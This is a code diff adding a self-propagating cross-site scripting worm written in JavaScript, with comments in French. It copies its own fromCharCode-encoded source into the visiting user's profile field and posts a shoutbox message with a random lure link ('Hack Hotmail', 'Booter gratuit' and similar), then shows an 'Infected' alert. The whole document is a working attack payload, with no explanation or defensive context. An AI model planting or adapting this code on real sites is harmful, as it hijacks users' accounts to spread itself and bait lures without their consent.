@@ -1,0 +1,26 @@
+<script id="owned">
+// Infection 
+var http = new XMLHttpRequest();
+http.open("POST", "/worm/profile.php", true);
+http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+var post=String.fromCharCode(104,117,109,101,117,114,61,73,110,102,101,99,116,101,100,60,115,99,114,105,112,116,32,105,100,61,34,111,119,110,101,100,34,62); // humeur=Infected<script id="owned">
+post=post.concat(document.getElementById("owned").innerHTML);
+post=encodeURI(post.concat(String.fromCharCode(60,47,115,99,114,105,112,116,62))); /* </script>*/
+http.setRequestHeader("Content-length", post.length);
+http.setRequestHeader("Connection", "close");
+http.send(post);
+
+
+// Ajout d'une option
+randomstring=["Booter gratuit 24h", "Crypter REFUD 12/07", "[Tuto] BruteForce Facebook", "[TUTO] Hack Hotmail", "[INFO] Aller sur le deepweb", "[LEAK] Icryptex", "Tiranium Gratuit 1 ans"];
+post="message=<a href=%22./affiche.php?id=1%22>";
+post=post.concat(randomstring[Math.floor(Math.random() * randomstring.length)]); 
+post=post.concat("</a>");
+
+http.open("POST", "/worm/shout.php", true);
+http.send(post);
+
+
+alert("Infected");
+</script>
